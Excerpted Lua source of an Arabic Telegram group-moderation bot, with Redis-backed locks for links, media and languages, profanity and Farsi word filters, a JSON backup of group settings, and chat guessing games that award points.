if DevRio:hget(SAKO.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") then
Time_Spam = DevRio:hget(SAKO.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") 
end 
end
end 
--     Source SAKO     --
...
if Constructor(msg) or tonumber(msg.sender_user_id_) == tonumber(SAKO) then
DevRio:set(SAKO..'Rio:PinnedMsg'..msg.chat_id_,msg.content_.message_id_)
else
local pin_id = DevRio:get(SAKO..'Rio:PinnedMsg'..msg.chat_id_)
if pin_id and DevRio:get(SAKO..'Rio:Lock:Pin'..msg.chat_id_) then
pinmsg(msg.chat_id_,pin_id,0)
end
end
end
if DevRio:get(SAKO..'Rio:viewget'..msg.sender_user_id_) then
if not msg.forward_info_ then
DevRio:del(SAKO..'Rio:viewget'..msg.sender_user_id_)
else
...
if DevRio:get(SAKO..'Rio:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevRio:get(SAKO..'Rio:Lock:Photo'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevRio:get(SAKO..'Rio:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevRio:get(SAKO..'Rio:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevRio:get(SAKO..'Rio:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevRio:get(SAKO..'Rio:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevRio:get(SAKO..'Rio:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevRio:get(SAKO..'Rio:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
...
if DevRio:get(SAKO..'Rio:Lock:Markdown'..msg.chat_id_) then
if not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
...
if DevRio:get(SAKO..'Rio:Lock:Document'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if not VipMem(msg) then
if DevRio:get(SAKO..'Rio:Lock:Inline'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source SAKO     --
...
elseif msg.content_.ID == "MessageSticker" then
if not VipMem(msg) then
if DevRio:get(SAKO..'Rio:Lock:Stickers'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
...
if DevRio:get(SAKO..'Rio:Groups:Welcomes'..msg.chat_id_) then
Welcomes = DevRio:get(SAKO..'Rio:Groups:Welcomes'..msg.chat_id_)
else
Welcomes = '• نورت حبي \n• firstname \n• username'
end
...
if DevRio:get(SAKO.."Rio:Lock:Welcome"..msg.chat_id_) then
getUser(msg.sender_user_id_,get_welcome)
end
--     Source SAKO     --
--      New User Add      --
elseif msg.content_.ID == "MessageChatAddMembers" then
if not DevRio:get(SAKO..'Rio:Lock:BotWelcome') then 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = SAKO,offset_ = 0,limit_ = 1},function(extra,rio,success) 
for i=0,#msg.content_.members_ do    
BotWelcome = msg.content_.members_[i].id_    
if BotWelcome and BotWelcome == tonumber(SAKO) then 
if DevRio:sismember(SAKO..'Rio:Groups',msg.chat_id_) then BotText = "مفعله في السابق\n᥀︙ارسل ↫ الاوامر واستمتع بالمميزيات" else BotText = "معطله يجب رفعي مشرف\n᥀︙بعد ذلك يرجى ارسال امر ↫ تفعيل\n᥀︙سيتم رفع الادمنيه والمنشئ تلقائيا" end 
if DevRio:get(SAKO.."Rio:Text:BotWelcome") then RioText = DevRio:get(SAKO.."Rio:Text:BotWelcome") else RioText = "᥀︙مرحبا انا بوت اسمي "..NameBot.."\n᥀︙حالة المجموعه ↫ "..BotText.."\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉" end 
if DevRio:get(SAKO.."Rio:Photo:BotWelcome") then RioPhoto = DevRio:get(SAKO.."Rio:Photo:BotWelcome") elseif rio.photos_[0] then RioPhoto = rio.photos_[0].sizes_[1].photo_.persistent_id_ else RioPhoto = nil end 
...
if DevRio:get(SAKO..'Rio:Lock:Contact'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source SAKO     --
...
if DevRio:get(SAKO..'Rio:Lock:Music'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if DevRio:get(SAKO..'Rio:Lock:Voice'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if DevRio:get(SAKO..'Rio:Lock:Location'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
if msg.content_.caption_ then
...
if DevRio:get(SAKO..'Rio:Lock:Videos'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if DevRio:get(SAKO..'Rio:Lock:Gifs'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
...
if DevRio:get(SAKO..'Rio:Lock:Text'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
...
if not DevRio:get(SAKO..'Rio:Spam:Text'..msg.chat_id_) then
sens = 400
else
sens = tonumber(DevRio:get(SAKO..'Rio:Spam:Text'..msg.chat_id_))
end
if DevRio:get(SAKO..'Rio:Lock:Spam'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
...
--     Source SAKO     --
if DevRio:get(SAKO.."Rio:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) then
if text == "الغاء" then
send(msg.chat_id_,msg.id_,"᥀︙تم الغاء حفظ الرابط")       
DevRio:del(SAKO.."Rio:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) 
return false
end
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local Link = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
DevRio:set(SAKO.."Rio:Groups:Links"..msg.chat_id_,Link)
...
if DevRio:get('SAKOTeam:'..SAKO.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevRio:del('SAKOTeam:'..SAKO..'id:user'..msg.chat_id_)  
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء الامر', 1, 'md')
DevRio:del('SAKOTeam:'..SAKO.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevRio:del('SAKOTeam:'..SAKO.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevRio:get('SAKOTeam:'..SAKO..'id:user'..msg.chat_id_)  
DevRio:incrby(SAKO..'Rio:UsersMsgs'..msg.chat_id_..':'..iduserr,numadded)
Dev_Rio(msg.chat_id_, msg.id_,  1, "᥀︙تم اضافة "..numadded..' رساله', 1, 'md')
DevRio:del('SAKOTeam:'..SAKO..'id:user'..msg.chat_id_) 
end
end
if text and Constructor(msg) then 
if DevRio:get('SAKOTeam:'..SAKO.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevRio:del('SAKOTeam:'..SAKO..'ids:user'..msg.chat_id_)  
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء الامر', 1, 'md')
DevRio:del('SAKOTeam:'..SAKO.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevRio:del('SAKOTeam:'..SAKO.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevRio:get('SAKOTeam:'..SAKO..'ids:user'..msg.chat_id_)  
DevRio:incrby(SAKO..'Rio:GamesNumber'..msg.chat_id_..iduserr,numadded)  
...
if not DevRio:get(SAKO.."Rio:Lock:Fshar"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
...
if DevRio:get(SAKO.."Rio:Lock:Farsi"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","᥀︙ممنوع التكلم بالغه الفارسيه هنا")  
end end
if text and (text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") or text:match("راحتی") or text:match("خسته") or text:match("بیام") or text:match("بپوشم") or text:match("كرمه")) then
if DevRio:get(SAKO.."Rio:Lock:FarsiBan"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ChatKick(msg.chat_id_, msg.sender_user_id_)
end end 
if text and (text:match("خره بالله") or text:match("خبربك") or text:match("كسدينربك") or text:match("خرب بالله") or text:match("خرب الله") or text:match("خره بربك") or text:match("الله الكواد") or text:match("خره بمحمد") or text:match("كسم الله") or text:match("كسم ربك") or text:match("كسربك") or text:match("كسختالله") or text:match("كسخت الله") or text:match("خره بدينك") or text:match("خرهبدينك") or text:match("كسالله") or text:match("خربالله")) then
if not DevRio:get(SAKO.."Rio:Lock:Kfr"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
...
if not DevRio:get(SAKO.."Rio:Lock:Taf"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
...
local List = DevRio:smembers(SAKO..'Rio:Groups') 
local BotName = (DevRio:get(SAKO.."Rio:NameBot") or 'ديفد')
local GetJson = '{"BotId": '..SAKO..',"BotName": "'..BotName..'","GroupsList":{'  
for k,v in pairs(List) do 
LinkGroups = DevRio:get(SAKO.."Rio:Groups:Links"..v)
Welcomes = DevRio:get(SAKO..'Rio:Groups:Welcomes'..v) or ''
Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
RioConstructors = DevRio:smembers(SAKO..'Rio:RioConstructor:'..v)
Constructors = DevRio:smembers(SAKO..'Rio:BasicConstructor:'..v)
BasicConstructors = DevRio:smembers(SAKO..'Rio:Constructor:'..v)
Managers = DevRio:smembers(SAKO..'Rio:Managers:'..v)
Admis = DevRio:smembers(SAKO..'Rio:Admins:'..v)
Vips = DevRio:smembers(SAKO..'Rio:VipMem:'..v)
if k == 1 then
GetJson = GetJson..'"'..v..'":{'
else
GetJson = GetJson..',"'..v..'":{'
...
GetJson = GetJson..'}}'
local File = io.open('./'..SAKO..'.json', "w")
File:write(GetJson)
File:close()
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './'..SAKO..'.json', '᥀︙يحتوي الملف على ↫ '..#List..' مجموعه',dl_cb, nil)
io.popen('rm -rf ./'..SAKO..'.json')
end
...
--     Source SAKO     --
if DevRio:get(SAKO.."SET:GAME"..msg.chat_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
Dev_Rio( msg.chat_id_, msg.id_, 1,"᥀︙يوجد فقط ( 6 ) اختيارات\n᥀︙ارسل اختيارك مره اخرى", 1, "md")    
return false  end 
local GETNUM = DevRio:get(SAKO.."GAMES"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevRio:del(SAKO.."SET:GAME"..msg.chat_id_)   
Dev_Rio( msg.chat_id_, msg.id_, 1,'᥀︙*المحيبس باليد رقم* ↫ '..NUM..'\n᥀︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, "md") 
DevRio:incrby(SAKO..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
...
if DevRio:get(SAKO..'DevRio4'..msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
send(msg.chat_id_, msg.id_, "᥀︙تم الغاء الامر")
DevRio:del(SAKO..'DevRio4'..msg.sender_user_id_)
return false  end 
DevRio:del(SAKO..'DevRio4'..msg.sender_user_id_)
...
DevRio:set(SAKO..'Rio:ChId',data.id_)
else
...
--     Source SAKO     --
if DevRio:get(SAKO.."Rio:DevText"..msg.chat_id_..":" .. msg.sender_user_id_) then
if text and text:match("^الغاء$") then 
DevRio:del(SAKO.."Rio:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء الامر', 1, 'md')
return false 
end 
DevRio:del(SAKO.."Rio:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
local DevText = msg.content_.text_:match("(.*)")
DevRio:set(SAKO.."DevText", DevText)
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ كليشة المطور", 1, "md")
end
if DevRio:get(SAKO..'Rio:NameBot'..msg.sender_user_id_) == 'msg' then
if text and text:match("^الغاء$") then 
DevRio:del(SAKO..'Rio:NameBot'..msg.sender_user_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء الامر', 1, 'md')
return false 
end 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ اسم البوت ', 1, 'html')
DevRio:del(SAKO..'Rio:NameBot'..msg.sender_user_id_)
DevRio:set(SAKO..'Rio:NameBot', text)
return false 
end
--     Source SAKO     --
if text == "الرابط" then
if not DevRio:get(SAKO..'Rio:Lock:GpLinks'..msg.chat_id_) then 
if DevRio:get(SAKO.."Rio:Groups:Links"..msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙Group Link ↬ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"..DevRio:get(SAKO.."Rio:Groups:Links"..msg.chat_id_), 1, "html")
else 
...
--     Source SAKO     --
if text == "الرابط" then
if not DevRio:get(SAKO.."Rio:Lock:GpLinksinline"..msg.chat_id_) then 
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_)) or DevRio:get(SAKO.."Private:Group:Link"..msg.chat_id_) 
...
NameBot = (DevRio:get(SAKO..'Rio:NameBot') or 'ديفد')
local SAKOTeam = {' كول حبيبي ؟ اني '..NameBot..' ',' وياك القميل '..NameBot..' ',' اسمي القميل '..NameBot..' '}
DevRio2 = math.random(#SAKOTeam) 
Dev_Rio(msg.chat_id_, msg.id_, 1, SAKOTeam[DevRio2] , 1, 'html') 
return false
end
if text == 'اسم البوت' or text == 'البوت شنو اسمه' or text == 'شسمه البوت' or text == 'البوت شسمه' then
NameBot = (DevRio:get(SAKO..'Rio:NameBot') or 'ديفد') 
local SAKOTeam = {"اسمي القميل "..NameBot.." "} 
DevRio2 = math.random(#SAKOTeam) 
Dev_Rio(msg.chat_id_, msg.id_, 1, SAKOTeam[DevRio2] , 1, 'html') 
return false
end
if text and text == (DevRio:get(SAKO..'Rio:NameBot') or 'ديفد') then 
NameBot = (DevRio:get(SAKO..'Rio:NameBot') or 'ديفد')
...
if tonumber((DevRio:get(SAKO..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙لم تربح اي نقطه\n᥀︙ارسل ↫ الالعاب للعب', 1, 'md')
else 
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙عدد النقاط التي ربحتها ↫ '..(DevRio:get(SAKO..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_)), 1, 'md')
end
end
if text ==  'حذف رسائلي' and ChCheck(msg) or text ==  'مسح رسائلي' and ChCheck(msg) then DevRio:del(SAKO..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_) Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حذف جميع رسائلك', 1, 'md') end
if text ==  'حذف نقاطي' and ChCheck(msg) or text ==  'مسح نقاطي' and ChCheck(msg) then DevRio:del(SAKO..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_) Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حذف جميع نقاطك', 1, 'md') end
--     Source SAKO     --
if text == 'سمايلات' and ChCheck(msg) or text == 'السمايلات' and ChCheck(msg) or text == '↫ سمايلات ᥀' and ChCheck(msg) then
if not DevRio:get(SAKO..'Rio:Lock:Games'..msg.chat_id_) then
DevRio2 = {'🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🍈','🍒','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥒','🌶','🌽','🥕','🥔','🍠','🥐','🍞','🥖','🥨','🧀','🥚','🍳','🥞','🥓','🥩','🍗','🍖','🌭','🍔','🍟','🍕','🥪','🥙','🍼','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🏆','🎻','🎸','🎺','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🛎','📤','🎗','🏵','🎖','🏆','🥌','🛷','🚕','🚗','🚙','🚌','🚎','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔️','🛡','🔮','🌡','💣','⏱','🛢','📓','📗','📂','📅','📪','📫','📬','📭','⏰','📺','🎚','☎️','📡'}
name = DevRio2[math.random(#DevRio2)]
DevRio:set(SAKO..'Rio:GameNum'..msg.chat_id_,name)
DevRio:del(SAKO..'Rio:Games:Ids'..msg.chat_id_)
...
name = string.gsub(name,'🎚','🎚')
name = string.gsub(name,'☎️','☎️')
SAKOTeam = '᥀︙اول واحد يدز هذا السمايل يربح ↫ '..name
Dev_Rio(msg.chat_id_, msg.id_, 1,SAKOTeam, 1, 'md')
return false
end end
if text == DevRio:get(SAKO..'Rio:GameNum'..msg.chat_id_) and not DevRio:get(SAKO..'Rio:Games:Ids'..msg.chat_id_) then
if not DevRio:get(SAKO..'Rio:Games:Ids'..msg.chat_id_) then 
SAKOTeam = '᥀︙مبروك لقد ربحت في اللعبه \n᥀︙ارسل ↫ سمايلات للعب مره اخرى'
Dev_Rio(msg.chat_id_, msg.id_, 1,SAKOTeam, 1, 'md')
DevRio:incrby(SAKO..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevRio:set(SAKO..'Rio:Games:Ids'..msg.chat_id_,true)
end
...
SAKOTeam = '᥀︙اول واحد يرتبها يربح ↫ '..name
Dev_Rio(msg.chat_id_, msg.id_, 1,SAKOTeam, 1, 'md')
return false
end end
if text == DevRio:get(SAKO..'Rio:GameNum'..msg.chat_id_) and not DevRio:get(SAKO..'Rio:Games:Ids'..msg.chat_id_) then
...
if not DevRio:get(SAKO..'Rio:Lock:Games'..msg.chat_id_) then
Num = math.random(1,6)
DevRio:set(SAKO.."GAMES"..msg.chat_id_,Num) 
TEST = [[
➀     ➁     ➂     ➃     ➄     ➅
↓     ↓     ↓     ↓     ↓     ↓
👊 ‹› 👊🏻 ‹› 👊🏼 ‹› 👊🏽 ‹› 👊🏾 ‹› 👊🏿
...
DevRio:setex(SAKO.."SET:GAME"..msg.chat_id_, 100, true)  
return false  
end end
...
SAKOTeam = '᥀︙اول واحد يحلها يربح ↫ '..name
Dev_Rio(msg.chat_id_, msg.id_, 1,SAKOTeam, 1, 'md')
return false
end end
if text == DevRio:get(SAKO..'Rio:GameNum'..msg.chat_id_) and not DevRio:get(SAKO..'Rio:Games:Ids'..msg.chat_id_) then
...
name = DevRio2[math.random(#DevRio2)]
DevRio:set(SAKO..'Rio:GameNum2'..msg.chat_id_,name)
DevRio:del(SAKO..'Rio:Games:Ids'..msg.chat_id_)
...
SAKOTeam = '᥀︙ما معنى هذا السمايل :؟ ↫ '..name
Dev_Rio(msg.chat_id_, msg.id_, 1,SAKOTeam, 1, 'md')
return false
end end
if text == DevRio:get(SAKO..'Rio:GameNum2'..msg.chat_id_) and not DevRio:get(SAKO..'Rio:Games:Ids'..msg.chat_id_) then
if not DevRio:get(SAKO..'Rio:Games:Ids'..msg.chat_id_) then 
...
name = DevRio2[math.random(#DevRio2)]
DevRio:set(SAKO..'Rio:GameNum3'..msg.chat_id_,name)
DevRio:del(SAKO..'Rio:Games:Ids'..msg.chat_id_)
...
SAKOTeam = '᥀︙ما هو عكس كلمة ↫ '..name
Dev_Rio(msg.chat_id_, msg.id_, 1,SAKOTeam, 1, 'md')
return false
end end
if text == DevRio:get(SAKO..'Rio:GameNum3'..msg.chat_id_) and not DevRio:get(SAKO..'Rio:Games:Ids'..msg.chat_id_) then
if not DevRio:get(SAKO..'Rio:Games:Ids'..msg.chat_id_) then 
...
DevRio2 = {'😸','☠','🐼','🐇','🌑','🌚','⭐️','📥','⛈','🌥','⛄️','👨‍🔬','👨‍💻','👨‍🔧','👩‍🍳','🧚‍♀','🧚‍♂️','🧝‍♂','🙍‍♂','🧖‍♂','👬','👨‍👨‍👧','🕓','🕤','⌛️','📅','👩‍⚖️','👨‍🎨'};
name = DevRio2[math.random(#DevRio2)]
DevRio:set(SAKO..'Rio:GameNum4'..msg.chat_id_,name)
DevRio:del(SAKO..'Rio:Games:Ids'..msg.chat_id_)
name = string.gsub(name,'😸','😹😹😹😸😹😹😹😹')
name = string.gsub(name,'☠️','💀💀💀☠️💀💀💀💀')
name = string.gsub(name,'🐼','👻👻👻👻👻👻👻🐼')
...
name = string.gsub(name,'👩‍⚖️','👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👨‍⚖️👩‍⚖️👨‍⚖️👨‍⚖️')
name = string.gsub(name,'👨‍🎨','👩‍🎨👩‍🎨👨‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨👩‍🎨')
SAKOTeam = '᥀︙اول واحد يطلع المختلف يربح\n{'..name..'} '
Dev_Rio(msg.chat_id_, msg.id_, 1,SAKOTeam, 1, 'md')
return false
end end
if text == DevRio:get(SAKO..'Rio:GameNum4'..msg.chat_id_) and not DevRio:get(SAKO..'Rio:Games:Ids'..msg.chat_id_) then
if not DevRio:get(SAKO..'Rio:Games:Ids'..msg.chat_id_) then 
...
name = DevRio2[math.random(#DevRio2)]
DevRio:set(SAKO..'Rio:GameNum5'..msg.chat_id_,name)
DevRio:del(SAKO..'Rio:Games:Ids'..msg.chat_id_)
...
SAKOTeam = '᥀︙اكمل المثال التالي ↫ ['..name..']'
Dev_Rio(msg.chat_id_, msg.id_, 1,SAKOTeam, 1, 'md')
return false
end end
if text == DevRio:get(SAKO..'Rio:GameNum5'..msg.chat_id_) then
if not DevRio:get(SAKO..'Rio:Games:Ids'..msg.chat_id_) then 
DevRio:incrby(SAKO..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevRio:del(SAKO..'Rio:GameNum5'..msg.chat_id_)
...
name = DevRio2[math.random(#DevRio2)]
DevRio:set(SAKO..'Rio:GameNum6'..msg.chat_id_,name)
DevRio:del(SAKO..'Rio:Games:Ids'..msg.chat_id_)
...
SAKOTeam = '᥀︙اكمل المعادله التاليه ↫ ⤈\n{'..name..'} '
Dev_Rio(msg.chat_id_, msg.id_, 1,SAKOTeam, 1, 'md')
return false
end end
if text == DevRio:get(SAKO..'Rio:GameNum6'..msg.chat_id_) then
if not DevRio:get(SAKO..'Rio:Games:Ids'..msg.chat_id_) then 
DevRio:incrby(SAKO..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevRio:del(SAKO..'Rio:GameNum6'..msg.chat_id_)
...
name = DevRio2[math.random(#DevRio2)]
DevRio:set(SAKO..'Rio:GameNum7'..msg.chat_id_,name)
DevRio:del(SAKO..'Rio:Games:Ids'..msg.chat_id_)
...
SAKOTeam = '᥀︙ما معنى كلمة ↫ '..name
Dev_Rio(msg.chat_id_, msg.id_, 1,SAKOTeam, 1, 'md')
return false
end end
if text == DevRio:get(SAKO..'Rio:GameNum7'..msg.chat_id_) then
if not DevRio:get(SAKO..'Rio:Games:Ids'..msg.chat_id_) then 
DevRio:incrby(SAKO..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevRio:del(SAKO..'Rio:GameNum7'..msg.chat_id_)
...
name = DevRio2[math.random(#DevRio2)]
DevRio:set(SAKO..'Rio:GameNum8'..msg.chat_id_,name)
DevRio:del(SAKO..'Rio:Games:Ids'..msg.chat_id_)
...
if text == DevRio:get(SAKO..'Rio:GameNum8'..msg.chat_id_) then
if not DevRio:get(SAKO..'Rio:Games:Ids'..msg.chat_id_) then 
DevRio:incrby(SAKO..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
DevRio:del(SAKO..'Rio:GameNum8'..msg.chat_id_)
...
--     Source SAKO     --
if DevRio:get(SAKO.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
Dev_Rio(msg.chat_id_, msg.id_, 1,"᥀︙عذرا لا يمكنك تخمين عدد اكبر من الـ20 خمن رقم ما بين الـ1 والـ20", 1, 'md')
return false  end 
local GETNUM = DevRio:get(SAKO.."GAMES:NUM"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
DevRio:del(SAKO..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevRio:del(SAKO.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
DevRio:incrby(SAKO..'Rio:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙*التخمين الصحيح هو* ↫ '..NUM..'\n᥀︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, 'md')
elseif tonumber(NUM) ~= tonumber(GETNUM) then
DevRio:incrby(SAKO..'Set:Num'..msg.chat_id_..msg.sender_user_id_,1)
if tonumber(DevRio:get(SAKO..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) >= 3 then
DevRio:del(SAKO..'Set:Num'..msg.chat_id_..msg.sender_user_id_)
DevRio:del(SAKO.."GAME:TKMEN"..msg.chat_id_.."" .. msg.sender_user_id_)   
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙*التخمين الصحيح هو* ↫ '..GETNUM..'\n᥀︙*للاسف لقد خسرت حاول مره اخرى لتخمين الرقم الصحيح*', 1, 'md')
else
if tonumber(DevRio:get(SAKO..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 1 then
SetNum = 'محاولتان فقط'
elseif tonumber(DevRio:get(SAKO..'Set:Num'..msg.chat_id_..msg.sender_user_id_)) == 2 then
...
DevRio:set(SAKO.."GAMES:NUM"..msg.chat_id_,Num) 
